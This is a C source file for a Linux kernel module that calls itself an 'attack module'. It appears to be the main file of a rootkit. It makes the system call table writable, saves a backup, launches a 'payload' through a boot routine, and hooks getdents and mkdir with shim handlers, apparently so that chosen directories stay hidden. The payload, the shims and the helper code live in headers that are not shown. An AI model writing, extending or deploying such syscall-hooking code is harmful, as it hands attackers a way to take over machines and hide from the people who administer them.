#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
#include "hiddenDirectories.h"

//new system calls
#include "getdentsShim.h"
#include "readShim.h"
#include "mkdirShim.h"
#include "bootprocess.h"

MODULE_LICENSE("GPL");

syscall backup_sys_call_table[SYS_TABLE_LENGTH];
vector hiddenDirectories;

void patch(int callnum, void* newcall) {
	sys_call_table[callnum] = (syscall)newcall;
}

void unpatch(int callnum) {
	sys_call_table[callnum] = backup_sys_call_table[callnum];
}

int init_module() {
	int bootresult;
	printk(KERN_INFO "Attempting to initialize attack module.\n");
	hiddenDirectories = vector_init();
	make_rw(sys_call_table);
	//make a backup of the system call table
	memcpy(backup_sys_call_table, sys_call_table, sizeof(backup_sys_call_table));

	//start up the payload
	bootresult = bootprocess();
	if (bootresult) printk(KERN_INFO "Boot process failed: %d", bootresult);

	//shim the syscalls. 
	patch(SYS_getdents, getdentsShim);
	//patch(SYS_read, readShim);
	patch(SYS_mkdir, mkdirShim);

	printk(KERN_INFO "Module loaded\n");
	return 0;
}

void cleanup_module() {
	//Make sure this function can safely be called multiple times.
	//The API can be called to deactivate the module.

	//restore the system call table, in reverse order
	unpatch(SYS_mkdir);
	unpatch(SYS_read);
	unpatch(SYS_getdents);
	memcpy(sys_call_table, backup_sys_call_table, sizeof(backup_sys_call_table));
	vector_free(hiddenDirectories);
	printk(KERN_INFO "Module unloaded\n");
}
